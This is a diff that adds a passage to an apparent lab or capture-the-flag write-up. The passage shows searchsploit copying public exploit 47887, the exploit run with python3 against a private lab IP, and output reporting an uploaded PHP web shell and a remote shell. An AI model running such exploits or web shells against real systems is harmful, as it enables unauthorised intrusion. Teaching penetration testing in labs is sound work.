@@ -119,3 +119,34 @@ root@ip-10-10-92-190:~/Instructions# searchsploit 47887 -p
  Verified: True
 File Type: ASCII text
 ```
+
+The Path in the above output tells me where on my machine searchsploit is storing the exploit file. I can run the script in that directory or copy it over to my current directory. I usually copy it to my directory in case I need to make modifications or if I am including the script in a write up. I copy the script by running:
+
+`searchsploit 47887 -m`
+
+The above command is the same as running the following:
+
+`cp /opt/exploitdb/exploits/php/webapps/47887.py .`
+
+I run any python script with python3 because python has been end of life since January 1st, 2020. In the extremely rare event that a script needs python2, I will usually just update the script to work for python3. This script would not work with python2 since it uses the built in input command and that is handled slightly differently between python2 and python3.
+
+Now I run the command with the following:
+
+`python3 47887.py`
+
+This generated an error saying that the script needs a url to be provided. So I included the root url to the application:
+
+`python3 47887.py http://10.10.1.1`
+
+This generated the output I was hoping for:
+
+```bash
+> Attempting to upload PHP web shell...
+> Verifying shell upload...
+> Web shell uploaded to http://10.10.1.1/bootstrap/img/oUde8ShIJA.php
+> Example command usage: http://10.10.1.1/bootstrap/img/oUde8ShIJA.php?cmd=whoami
+> Do you wish to launch a shell here? (y/n): y
+RCE $
+```
+
+I now have remote shell access on the target machine!
